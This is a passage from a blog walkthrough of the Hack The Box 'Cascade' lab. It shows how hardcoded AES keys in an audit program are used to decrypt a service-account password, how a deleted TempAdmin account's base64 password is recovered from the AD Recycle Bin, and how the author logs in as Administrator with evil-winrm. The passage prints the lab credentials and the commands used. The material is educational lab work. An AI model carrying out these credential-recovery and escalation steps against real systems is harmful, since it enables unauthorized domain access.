<h3 id="auditdb">Audit.db</h3>
<p>This is an SQLite database and it has some very interesting data in the <code>Ldap</code> table.</p>
<p>![[cascade1.png]]</p>
<p><code>ArkSvc:BQO5l5Kj9MdErXx6Q6AGOw==</code></p>
<p>Trying to decode that Base64 string produces nothing but jibberish (again), so it&rsquo;s likely encrypted. Maybe we&rsquo;ll have to go back and take a closer look at <code>CascAudit.exe</code> to see if there&rsquo;s any clues to decrypting it.</p>
<h3 id="cascauditexe">CascAudit.exe</h3>
<p>Viewing the executable in dnSpy, we see an interesting tidbit of code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span>password = Crypto.DecryptString(encryptedString, <span style="color:#e6db74">&#34;c4scadek3y654321&#34;</span>);
</span></span></code></pre></div><p>We then look at the <code>CascCrypto.dll</code> dependency, and find the <code>DecryptString</code> function. It has another helpful few tidbits for us:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span>aes.IV = Encoding.UTF8.GetBytes(<span style="color:#e6db74">&#34;1tdyjCbY1Ix49842&#34;</span>);
</span></span><span style="display:flex;"><span>aes.Mode = CipherMode.CBC
</span></span></code></pre></div><p>Looks like we&rsquo;re using AES CBC, and now have the key and IV. Let&rsquo;s use good ol&rsquo; Cyber Chef and decrypt our password.</p>
<p>![[cascade3.png]]</p>
<p>And now we&rsquo;ve got a new set of credentials: <code>ArkSvc:w3lc0meFr31nd</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cascade<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ evil-winrm -i 10.129.145.225 -u ArkSvc -p <span style="color:#e6db74">&#39;w3lc0meFr31nd&#39;</span>        
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\a</span>rksvc<span style="color:#ae81ff">\D</span>ocuments&gt;
</span></span></code></pre></div><h2 id="shell-as-arksvc">Shell as ArkSvc</h2>
<h3 id="enumeration-2">Enumeration</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\arksvc\Documents&gt; net user arksvc
</span></span><span style="display:flex;"><span>User name                    arksvc
</span></span><span style="display:flex;"><span>Full Name                    ArkSvc
</span></span><span style="display:flex;"><span>Comment
</span></span><span style="display:flex;"><span>User<span style="color:#960050;background-color:#1e0010">&#39;</span>s comment
</span></span><span style="display:flex;"><span>Country code                 <span style="color:#ae81ff">000</span> (System <span style="color:#66d9ef">Default</span>)
</span></span><span style="display:flex;"><span>Account active               Yes
</span></span><span style="display:flex;"><span>Account expires              Never
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Password last set            <span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">9</span>/<span style="color:#ae81ff">2020</span> <span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">18</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">20</span> PM
</span></span><span style="display:flex;"><span>Password expires             Never
</span></span><span style="display:flex;"><span>Password changeable          <span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">9</span>/<span style="color:#ae81ff">2020</span> <span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">18</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">20</span> PM
</span></span><span style="display:flex;"><span>Password required            Yes
</span></span><span style="display:flex;"><span>User may change password     No
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Workstations allowed         All
</span></span><span style="display:flex;"><span>Logon script
</span></span><span style="display:flex;"><span>User profile
</span></span><span style="display:flex;"><span>Home directory
</span></span><span style="display:flex;"><span>Last logon                   <span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">29</span>/<span style="color:#ae81ff">2020</span> <span style="color:#ae81ff">9</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">05</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">40</span> PM
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Logon hours allowed          All
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Local Group Memberships      *AD Recycle Bin       *IT
</span></span><span style="display:flex;"><span>                             *Remote Management Use
</span></span><span style="display:flex;"><span>Global Group memberships     *Domain Users
</span></span><span style="display:flex;"><span>The command completed successfully.
</span></span></code></pre></div><p>Once again, we see <code>AD Recycle Bin</code>, just like when we were looking at the SMB shares for <code>r.thompson</code> earlier. After some research, it seems this is a fairly common Windows group, and there might be a way to recover deleted items. Details can be found <a href="https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/" target="_blank">here</a>.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="ad-recycle-bin">AD Recycle Bin</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\&gt; Get-ADObject -filter <span style="color:#e6db74">&#39;isDeleted -eq $true -and name -ne &#34;Deleted Objects&#34;&#39;</span> -includeDeletedObjects 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Deleted           <span style="color:#960050;background-color:#1e0010">:</span> True
</span></span><span style="display:flex;"><span>DistinguishedName <span style="color:#960050;background-color:#1e0010">:</span> CN=CASC-WS1\0ADEL<span style="color:#960050;background-color:#1e0010">:</span>6d97daa4-<span style="color:#ae81ff">2e82</span>-<span style="color:#ae81ff">4946</span>-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
</span></span><span style="display:flex;"><span>Name              <span style="color:#960050;background-color:#1e0010">:</span> CASC-WS1
</span></span><span style="display:flex;"><span>                    DEL<span style="color:#960050;background-color:#1e0010">:</span>6d97daa4-<span style="color:#ae81ff">2e82</span>-<span style="color:#ae81ff">4946</span>-a11e-f91fa18bfabe
</span></span><span style="display:flex;"><span>ObjectClass       <span style="color:#960050;background-color:#1e0010">:</span> computer
</span></span><span style="display:flex;"><span>ObjectGUID        <span style="color:#960050;background-color:#1e0010">:</span> 6d97daa4-<span style="color:#ae81ff">2e82</span>-<span style="color:#ae81ff">4946</span>-a11e-f91fa18bfabe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Deleted           <span style="color:#960050;background-color:#1e0010">:</span> True
</span></span><span style="display:flex;"><span>DistinguishedName <span style="color:#960050;background-color:#1e0010">:</span> CN=Scheduled Tasks\0ADEL<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">13375728</span>-5ddb-<span style="color:#ae81ff">4137</span>-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
</span></span><span style="display:flex;"><span>Name              <span style="color:#960050;background-color:#1e0010">:</span> Scheduled Tasks
</span></span><span style="display:flex;"><span>                    DEL<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">13375728</span>-5ddb-<span style="color:#ae81ff">4137</span>-b8b8-b9041d1d3fd2
</span></span><span style="display:flex;"><span>ObjectClass       <span style="color:#960050;background-color:#1e0010">:</span> group
</span></span><span style="display:flex;"><span>ObjectGUID        <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">13375728</span>-5ddb-<span style="color:#ae81ff">4137</span>-b8b8-b9041d1d3fd2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Deleted           <span style="color:#960050;background-color:#1e0010">:</span> True
</span></span><span style="display:flex;"><span>DistinguishedName <span style="color:#960050;background-color:#1e0010">:</span> CN={A403B701-A528-<span style="color:#ae81ff">4685</span>-A816-FDEE32BDDCBA}\0ADEL<span style="color:#960050;background-color:#1e0010">:</span>ff5c2fdc-cc11-<span style="color:#ae81ff">44e3</span>-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
</span></span><span style="display:flex;"><span>Name              <span style="color:#960050;background-color:#1e0010">:</span> {A403B701-A528-<span style="color:#ae81ff">4685</span>-A816-FDEE32BDDCBA}
</span></span><span style="display:flex;"><span>                    DEL<span style="color:#960050;background-color:#1e0010">:</span>ff5c2fdc-cc11-<span style="color:#ae81ff">44e3</span>-ae4c-071aab2ccc6e
</span></span><span style="display:flex;"><span>ObjectClass       <span style="color:#960050;background-color:#1e0010">:</span> groupPolicyContainer
</span></span><span style="display:flex;"><span>ObjectGUID        <span style="color:#960050;background-color:#1e0010">:</span> ff5c2fdc-cc11-<span style="color:#ae81ff">44e3</span>-ae4c-071aab2ccc6e
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Deleted           <span style="color:#960050;background-color:#1e0010">:</span> True
</span></span><span style="display:flex;"><span>DistinguishedName <span style="color:#960050;background-color:#1e0010">:</span> CN=Machine\0ADEL<span style="color:#960050;background-color:#1e0010">:</span>93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
</span></span><span style="display:flex;"><span>Name              <span style="color:#960050;background-color:#1e0010">:</span> Machine
</span></span><span style="display:flex;"><span>                    DEL<span style="color:#960050;background-color:#1e0010">:</span>93c23674-e411-400b-bb9f-c0340bda5a34
</span></span><span style="display:flex;"><span>ObjectClass       <span style="color:#960050;background-color:#1e0010">:</span> container
</span></span><span style="display:flex;"><span>ObjectGUID        <span style="color:#960050;background-color:#1e0010">:</span> 93c23674-e411-400b-bb9f-c0340bda5a34
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Deleted           <span style="color:#960050;background-color:#1e0010">:</span> True
</span></span><span style="display:flex;"><span>DistinguishedName <span style="color:#960050;background-color:#1e0010">:</span> CN=User\0ADEL<span style="color:#960050;background-color:#1e0010">:</span>746385f2-e3a0-<span style="color:#ae81ff">4252</span>-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
</span></span><span style="display:flex;"><span>Name              <span style="color:#960050;background-color:#1e0010">:</span> User
</span></span><span style="display:flex;"><span>                    DEL<span style="color:#960050;background-color:#1e0010">:</span>746385f2-e3a0-<span style="color:#ae81ff">4252</span>-b83a-5a206da0ed88
</span></span><span style="display:flex;"><span>ObjectClass       <span style="color:#960050;background-color:#1e0010">:</span> container
</span></span><span style="display:flex;"><span>ObjectGUID        <span style="color:#960050;background-color:#1e0010">:</span> 746385f2-e3a0-<span style="color:#ae81ff">4252</span>-b83a-5a206da0ed88
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Deleted           <span style="color:#960050;background-color:#1e0010">:</span> True
</span></span><span style="display:flex;"><span>DistinguishedName <span style="color:#960050;background-color:#1e0010">:</span> CN=TempAdmin\0ADEL<span style="color:#960050;background-color:#1e0010">:</span>f0cc344d-<span style="color:#ae81ff">31e0</span>-<span style="color:#ae81ff">4866</span>-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
</span></span><span style="display:flex;"><span>Name              <span style="color:#960050;background-color:#1e0010">:</span> TempAdmin
</span></span><span style="display:flex;"><span>                    DEL<span style="color:#960050;background-color:#1e0010">:</span>f0cc344d-<span style="color:#ae81ff">31e0</span>-<span style="color:#ae81ff">4866</span>-bceb-a842791ca059
</span></span><span style="display:flex;"><span>ObjectClass       <span style="color:#960050;background-color:#1e0010">:</span> user
</span></span><span style="display:flex;"><span>ObjectGUID        <span style="color:#960050;background-color:#1e0010">:</span> f0cc344d-<span style="color:#ae81ff">31e0</span>-<span style="color:#ae81ff">4866</span>-bceb-a842791ca059
</span></span></code></pre></div><p>And look at that, there&rsquo;s the <code>TempAdmin</code> user in the AD Recycle Bin.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\&gt; Get-ADObject -filter { SAMAccountName <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;TempAdmin&#34;</span> } -includeDeletedObjects -property *
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>accountExpires                  <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">9223372036854775807</span>
</span></span><span style="display:flex;"><span>badPasswordTime                 <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>badPwdCount                     <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>CanonicalName                   <span style="color:#960050;background-color:#1e0010">:</span> cascade.local/Deleted Objects/TempAdmin
</span></span><span style="display:flex;"><span>                                  DEL<span style="color:#960050;background-color:#1e0010">:</span>f0cc344d-<span style="color:#ae81ff">31e0</span>-<span style="color:#ae81ff">4866</span>-bceb-a842791ca059
</span></span><span style="display:flex;"><span>cascadeLegacyPwd                <span style="color:#960050;background-color:#1e0010">:</span> YmFDVDNyMWFOMDBkbGVz
</span></span><span style="display:flex;"><span>CN                              <span style="color:#960050;background-color:#1e0010">:</span> TempAdmin
</span></span><span style="display:flex;"><span>                                  DEL<span style="color:#960050;background-color:#1e0010">:</span>f0cc344d-<span style="color:#ae81ff">31e0</span>-<span style="color:#ae81ff">4866</span>-bceb-a842791ca059
</span></span><span style="display:flex;"><span>codePage                        <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>countryCode                     <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Created                         <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">27</span>/<span style="color:#ae81ff">2020</span> <span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">23</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">08</span> AM
</span></span><span style="display:flex;"><span>createTimeStamp                 <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">27</span>/<span style="color:#ae81ff">2020</span> <span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">23</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">08</span> AM
</span></span><span style="display:flex;"><span>Deleted                         <span style="color:#960050;background-color:#1e0010">:</span> True
</span></span><span style="display:flex;"><span>Description                     <span style="color:#960050;background-color:#1e0010">:</span>
</span></span><span style="display:flex;"><span>DisplayName                     <span style="color:#960050;background-color:#1e0010">:</span> TempAdmin
</span></span><span style="display:flex;"><span>DistinguishedName               <span style="color:#960050;background-color:#1e0010">:</span> CN=TempAdmin\0ADEL<span style="color:#960050;background-color:#1e0010">:</span>f0cc344d-<span style="color:#ae81ff">31e0</span>-<span style="color:#ae81ff">4866</span>-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
</span></span><span style="display:flex;"><span>dSCorePropagationData           <span style="color:#960050;background-color:#1e0010">:</span> {<span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">27</span>/<span style="color:#ae81ff">2020</span> <span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">23</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">08</span> AM, <span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">1601</span> <span style="color:#ae81ff">12</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span> AM}
</span></span><span style="display:flex;"><span>givenName                       <span style="color:#960050;background-color:#1e0010">:</span> TempAdmin
</span></span><span style="display:flex;"><span>instanceType                    <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>isDeleted                       <span style="color:#960050;background-color:#1e0010">:</span> True
</span></span><span style="display:flex;"><span>LastKnownParent                 <span style="color:#960050;background-color:#1e0010">:</span> OU=Users,OU=UK,DC=cascade,DC=local
</span></span><span style="display:flex;"><span>lastLogoff                      <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>lastLogon                       <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>logonCount                      <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Modified                        <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">27</span>/<span style="color:#ae81ff">2020</span> <span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">24</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">34</span> AM
</span></span><span style="display:flex;"><span>modifyTimeStamp                 <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">27</span>/<span style="color:#ae81ff">2020</span> <span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">24</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">34</span> AM
</span></span><span style="display:flex;"><span>msDS-LastKnownRDN               <span style="color:#960050;background-color:#1e0010">:</span> TempAdmin
</span></span><span style="display:flex;"><span>Name                            <span style="color:#960050;background-color:#1e0010">:</span> TempAdmin
</span></span><span style="display:flex;"><span>                                  DEL<span style="color:#960050;background-color:#1e0010">:</span>f0cc344d-<span style="color:#ae81ff">31e0</span>-<span style="color:#ae81ff">4866</span>-bceb-a842791ca059
</span></span><span style="display:flex;"><span>nTSecurityDescriptor            <span style="color:#960050;background-color:#1e0010">:</span> System.DirectoryServices.ActiveDirectorySecurity
</span></span><span style="display:flex;"><span>ObjectCategory                  <span style="color:#960050;background-color:#1e0010">:</span>
</span></span><span style="display:flex;"><span>ObjectClass                     <span style="color:#960050;background-color:#1e0010">:</span> user
</span></span><span style="display:flex;"><span>ObjectGUID                      <span style="color:#960050;background-color:#1e0010">:</span> f0cc344d-<span style="color:#ae81ff">31e0</span>-<span style="color:#ae81ff">4866</span>-bceb-a842791ca059
</span></span><span style="display:flex;"><span>objectSid                       <span style="color:#960050;background-color:#1e0010">:</span> S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">3332504370</span>-<span style="color:#ae81ff">1206983947</span>-<span style="color:#ae81ff">1165150453</span>-<span style="color:#ae81ff">1136</span>
</span></span><span style="display:flex;"><span>primaryGroupID                  <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">513</span>
</span></span><span style="display:flex;"><span>ProtectedFromAccidentalDeletion <span style="color:#960050;background-color:#1e0010">:</span> False
</span></span><span style="display:flex;"><span>pwdLastSet                      <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">132245689883479503</span>
</span></span><span style="display:flex;"><span>sAMAccountName                  <span style="color:#960050;background-color:#1e0010">:</span> TempAdmin
</span></span><span style="display:flex;"><span>sDRightsEffective               <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>userAccountControl              <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">66048</span>
</span></span><span style="display:flex;"><span>userPrincipalName               <span style="color:#960050;background-color:#1e0010">:</span> TempAdmin@cascade.local
</span></span><span style="display:flex;"><span>uSNChanged                      <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">237705</span>
</span></span><span style="display:flex;"><span>uSNCreated                      <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">237695</span>
</span></span><span style="display:flex;"><span>whenChanged                     <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">27</span>/<span style="color:#ae81ff">2020</span> <span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">24</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">34</span> AM
</span></span><span style="display:flex;"><span>whenCreated                     <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">27</span>/<span style="color:#ae81ff">2020</span> <span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">23</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">08</span> AM
</span></span></code></pre></div><p>Another <code>cascadeLegacyPwd</code> value&hellip; let&rsquo;s decode.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cascade<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ echo <span style="color:#e6db74">&#39;YmFDVDNyMWFOMDBkbGVz&#39;</span> | base64 -d
</span></span><span style="display:flex;"><span>baCT3r1aN00dles
</span></span></code></pre></div><h3 id="shell-as-administrator">Shell as Administrator</h3>
<p>Let&rsquo;s use our new credentials and see if they work for the Administrator account. The email we read during SMB enumeration before seems to indicate they will.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cascade<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ evil-winrm -i 10.129.145.225 -u administrator -p <span style="color:#e6db74">&#39;baCT3r1aN00dles&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt;
</span></span></code></pre></div><p>Grab that <code>root.txt</code> and be done!</p>

  
  <hr>
<div class="footer">
    
	    
	    
    
</div>

  
</div>
            </main>
            
  
    <div class="article-toc ">
    <div class="toc-wrapper">
      <h4 id="contents"></h4>
      <nav id="TableOfContents">
  <ul>
    <li><a href="#scanning">Scanning</a>
      <ul>
        <li><a href="#nmap">nmap</a></li>
      </ul>
    </li>
    <li><a href="#enumeration">Enumeration</a>
      <ul>
        <li><a href="#smb">SMB</a></li>
        <li><a href="#ldap">LDAP</a></li>
      </ul>
    </li>
    <li><a href="#initial-access">Initial Access</a>
      <ul>
        <li><a href="#check-credentials">Check Credentials</a></li>
        <li><a href="#smb-again">SMB (again)</a></li>
        <li><a href="#vnc-password">VNC Password</a></li>
      </ul>
    </li>
    <li><a href="#shell-as-ssmith">Shell as s.smith</a>
      <ul>
        <li><a href="#enumeration-1">Enumeration</a></li>
        <li><a href="#smb-again-1">SMB (&hellip;again)</a></li>
        <li><a href="#auditdb">Audit.db</a></li>
        <li><a href="#cascauditexe">CascAudit.exe</a></li>
      </ul>
    </li>
    <li><a href="#shell-as-arksvc">Shell as ArkSvc</a>
      <ul>
        <li><a href="#enumeration-2">Enumeration</a></li>
      </ul>
    </li>
    <li><a href="#privilege-escalation">Privilege Escalation</a>
      <ul>
        <li><a href="#ad-recycle-bin">AD Recycle Bin</a></li>
        <li><a href="#shell-as-administrator">Shell as Administrator</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </div>
</div>

  

        </div>
    </body>
</html>
